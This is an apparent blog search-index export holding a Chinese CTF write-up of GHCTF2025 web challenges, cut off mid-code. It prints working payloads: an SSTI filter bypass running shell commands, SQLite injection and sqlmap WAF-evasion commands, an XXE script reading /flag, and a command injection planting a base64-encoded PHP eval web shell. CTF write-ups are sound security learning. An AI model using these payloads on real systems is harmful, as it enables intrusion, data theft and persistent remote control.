<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GHCTF2025</title>
    <link href="/2025/07/13/GHCTF2025/"/>
    <url>/2025/07/13/GHCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h1><p>看源码，将上传文件里的内容放入模板中渲染</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">tmp_str = &quot;&quot;&quot;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>查看文件内容<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>文件内容：</span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 显示文件名 --&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span></span><span class="hljs-template-variable">&#123;data&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>  <span class="hljs-comment">&lt;!-- 显示文件内容 --&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">footer</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-symbol">&amp;copy;</span> 2025 文件查看器<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)`</span><br><span class="language-xml">        </span><br></code></pre></td></tr></table></figure><p>但是有过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_dangerous_keywords</span>(<span class="hljs-params">file_path</span>):<br>    dangerous_keywords = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_content = <span class="hljs-built_in">str</span>(f.read())<br><br><br>        <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> dangerous_keywords:<br>            <span class="hljs-keyword">if</span> keyword <span class="hljs-keyword">in</span> file_content:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 找到危险关键字，返回 True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 文件内容中没有危险关键字</span><br></code></pre></td></tr></table></figure><p>采用request方法（结合过滤器attr）绕过</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.args.globals</span>)|attr(<span class="hljs-name">request.args.getitem</span>)(<span class="hljs-name">request.args.o1s</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">request.args.cmd</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">http://node2.anna.nssctf.cn:28969/file/111.txt?globals=__globals__&amp;getitem=__getitem__&amp;o1s=os&amp;cmd=cat%20/flag</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503021319822.png" alt="image-20250302131912723"></p><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node2.anna.nssctf.cn:<span class="hljs-number">28514</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503050948134.png" alt="image-20250305094830785"></p><p>但是select不出数据库来，似乎是有过滤（实际上是sqlite，不是mysql）</p><p>这里做题做出惯性来了，思维固化了，要避免，思考尽量全面</p><p>这个注入是Sqlite注入，了解完Sqlite的语法之后就可以直接做了</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://node1.anna.nssctf.cn:<span class="hljs-number">28305</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503232341847.jpeg" alt="NSSIMAGE"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,sqlite_version(),(<span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span> <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503232341887.jpeg" alt="NSSIMAGE"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,sqlite_version(),(<span class="hljs-keyword">select</span> group_concat(flag) <span class="hljs-keyword">from</span> flag)<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503232341083.jpeg" alt="NSSIMAGE"></p><p>用sqlmap也不行（实际上是简单试一次不行，似乎对sqlmap有过滤）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://node1.anna.nssctf.<span class="hljs-keyword">cn</span>:<span class="hljs-number">28019</span>/?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251430466.png" alt="image-20250325143059338"></p><p>按照sqlmap给的建议，加上<code>--random-agent</code>（使用随机的 User-Agent 头，避免被 WAF 识别），成功识别出sqlite，可以用盲注</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://node1.anna.nssctf.<span class="hljs-keyword">cn</span>:<span class="hljs-number">28019</span>/?id=<span class="hljs-number">1</span> --random-agent<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251426018.png" alt="image-20250325142658883"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python sqlmap.py -u http:<span class="hljs-string">//node1.anna.nssctf.cn</span><span class="hljs-function">:28019</span>/?id=1 <span class="hljs-params">--random-agent</span> <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251427673.png" alt="image-20250325142734535"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://node1.anna.nssctf.<span class="hljs-keyword">cn</span>:<span class="hljs-number">28019</span>/?id=<span class="hljs-number">1</span> --random-agent -T flag –columns<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251427505.png" alt="image-20250325142754386"></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python sqlmap.py -u http:<span class="hljs-string">//node1.anna.nssctf.cn</span><span class="hljs-function">:28019</span>/?id=1 <span class="hljs-params">--random-agent</span> -D flag -T flag <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251428098.png" alt="image-20250325142812998"></p><h1 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h1><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> re<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ghctf&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>():<br>    xml=request.form.get(<span class="hljs-string">&#x27;xml&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(xml)<br>    <span class="hljs-keyword">if</span> xml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No System is Safe.&quot;</span><br>    parser = etree.XMLParser(load_dtd=<span class="hljs-literal">True</span>, resolve_entities=<span class="hljs-literal">True</span>)<br>    root = etree.fromstring(xml, parser)<br>    name=root.find(<span class="hljs-string">&#x27;name&#x27;</span>).text<br>    <span class="hljs-keyword">return</span> name <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>是XXE，而且没有过滤</p><p>自己当时为啥没做出来？</p><p>明明已经用AI写好了脚本，十分接近答案了，但是功亏一溃，下面是原因，仅仅是多了一句</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">encoding</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;UTF-8&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503232333606.png" alt="image-20250323233305533"></p><p>这题给了代码，可以本地跑一个试试，如果试了的话，会发现不能加 encoding&#x3D;utf-8，</p><p>是因为lxml包不支持 “encoding declaration”</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102235989.png" alt="image-20250310220333873"></p><p>直接脚本读flag就出了</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">import requests</span><br><span class="language-xml"></span><br><span class="language-xml"># 目标 URL</span><br><span class="language-xml">url = &quot;http://node1.anna.nssctf.cn:28525/ghctf&quot;</span><br><span class="language-xml"></span><br><span class="language-xml"># 恶意 XML 数据</span><br><span class="language-xml">xml = &quot;&quot;&quot;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>&quot;&quot;&quot;</span><br><span class="language-xml"></span><br><span class="language-xml"># 发送 POST 请求</span><br><span class="language-xml">response = requests.post(url, data=</span><span class="hljs-template-variable">&#123;&quot;xml&quot;: xml&#125;</span><span class="language-xml">)</span><br><span class="language-xml"># 输出响应内容</span><br><span class="language-xml">print(&quot;Response:&quot;, response.text)</span><br></code></pre></td></tr></table></figure><p>这题主要还是自己没有做XXE的经验，不敢尝试，</p><p>是害怕导致一旦不出flag就逃了，</p><p>不能指望做过所有题，很多都是边搜边查做出来的，这样简单的题，网上一搜都是payload，实在是不应该</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503232336386.png" alt="image-20250323233615930"></p><p>以此为经验，</p><p>没做过也要死磕，尤其是简单题，</p><p>要记住多搜多看，</p><p>不能太过依赖AI，可以用AI与博客相结合</p><h1 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h1><p>考点：getimagesize和exif_imagetype绕过；</p><p>apache 的服务器, 很容易想到 .htaccess；但是后端检测了 mine 类型, 如果直接在 .htaccess 开头加入 <code>GIF89A</code> 的话访问整个 images 目录下的文件都会爆 500, 会出现语法错误。</p><p>.htaccess 通过 <code>#</code> 来注释, 后来了解到还有 <code>\x00</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251506596.png" alt="image-20250325150651482"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251506997.png" alt="image-20250325150600810"></p><p>蚁剑连接一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503251508115.png" alt="image-20250325150800852"></p><h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><p>读代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandExecutor</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logger</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$input</span>, <span class="hljs-string">&#x27; &#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;Invalid input: space detected&quot;</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No spaces allowed&#x27;</span>);<br>        &#125;<br><br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$output</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;Result: <span class="hljs-subst">$input</span>&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$output</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$executor</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$config</span>, <span class="hljs-variable">$logger</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config = <span class="hljs-variable">$config</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;executor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommandExecutor</span>(<span class="hljs-variable">$logger</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params"><span class="hljs-variable">$action</span>, <span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;allowed_actions&#x27;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid action&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$action</span> === <span class="hljs-string">&#x27;run&#x27;</span>) &#123;<br>            <span class="hljs-variable">$validator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputValidator</span>(<span class="hljs-variable language_">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;max_input_length&#x27;</span>));<br>            <span class="hljs-variable">$validationResult</span> = <span class="hljs-variable">$validator</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$input</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$validationResult</span> !== <span class="hljs-literal">true</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$validationResult</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;executor-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$input</span>);<br>        &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$action</span> === <span class="hljs-string">&#x27;debug&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Debug mode enabled&quot;</span>;<br>        &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$action</span> === <span class="hljs-string">&#x27;generate&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Random string: &quot;</span> . <span class="hljs-title class_">StringUtils</span>::<span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">15</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unknown action&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$config</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfigLoader</span>();<br>    <span class="hljs-variable">$logger</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>(<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;log_level&#x27;</span>));<br><br>    <span class="hljs-variable">$actionHandler</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionHandler</span>(<span class="hljs-variable">$config</span>, <span class="hljs-variable">$logger</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;input&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$actionHandler</span>-&gt;<span class="hljs-title function_ invoke__">handle</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-variable">$input</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$config</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfigLoader</span>();<br>    <span class="hljs-variable">$logger</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>(<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;log_level&#x27;</span>));<br>    <span class="hljs-variable">$userManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserManager</span>(<span class="hljs-variable">$logger</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;register&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$userManager</span>-&gt;<span class="hljs-title function_ invoke__">addUser</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$userManager</span>-&gt;<span class="hljs-title function_ invoke__">authenticate</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;No action provided, running default logic&quot;</span>);<br></code></pre></td></tr></table></figure><p>关键点在于CommandExecutor类的execute函数、ActionHandler类的handle函数，</p><p>然后我们写出payload</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?action=<span class="hljs-keyword">run</span><span class="language-bash">&amp;input=<span class="hljs-built_in">echo</span>%09PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=%2b|<span class="hljs-built_in">base64</span>%09-d&gt;shell.php</span><br></code></pre></td></tr></table></figure><p>实际上就是执行了下面这句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=+|<span class="hljs-built_in">base64</span> -d&gt;shell.php <br></code></pre></td></tr></table></figure><p>即</p><figure class="highlight php"><table><tr><td 